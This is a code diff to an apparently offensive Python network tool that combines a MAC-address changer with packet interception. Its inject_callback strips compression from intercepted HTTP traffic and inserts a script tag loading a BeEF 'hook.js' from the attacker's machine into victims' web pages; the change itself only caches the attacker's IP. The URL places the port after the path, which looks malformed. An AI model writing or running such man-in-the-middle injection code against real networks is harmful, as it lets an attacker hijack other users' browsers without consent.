@@ -9,6 +9,7 @@ import sys
 
 PORT = 80
 NIC = "eth0"
+CURRENT_IP = ""
 
 # ================================= For mac_changer ========================================
 def gen_mac_address():
@@ -229,13 +230,13 @@ def get_current_ip(nic):
     ifconfig_result = subprocess.check_output(["ifconfig", nic])
     ip_address_search_result = re.search(r"(?<=inet\s).*(?=\snetmask)", str(ifconfig_result))
     if ip_address_search_result:
-        return ip_address_search_result.group(0)
+        return str(ip_address_search_result.group(0))
     else:
         print("[---] ERROR! Could not read the IP-address")
         sys.exit()
 
-def hack_src(nic):
-    return "http://" + get_current_ip(nic) + "/hook.js:3000"
+def hack_src():
+    return "http://" + CURRENT_IP + "/hook.js:3000"
 
 def inject_callback(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -246,7 +247,7 @@ def inject_callback(packet):
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
         elif scapy_packet[scapy.TCP].sport == PORT:
             # print(scapy_packet.show())
-            injection_code = "<script defer src=" + hack_src(NIC) + "></script>"
+            injection_code = "<script defer src=" + hack_src() + "></script>"
             load = load.replace("</head>", injection_code + "</head>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -266,8 +267,10 @@ def callback_switch():
     elif "ds" == opt:
         packet = download_callback
     elif "ic" == opt:
-        packet = inject_callback
         raw_input("===>>> ALERT!!! Make sure you run 'BeEF' before!!! (press any key to continue)")
+        packet = inject_callback
+        global CURRENT_IP
+        CURRENT_IP = str(get_current_ip(NIC))
     return packet
 
 # THE MAIN FUNCTION FOR PACKET MODIFICATION <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
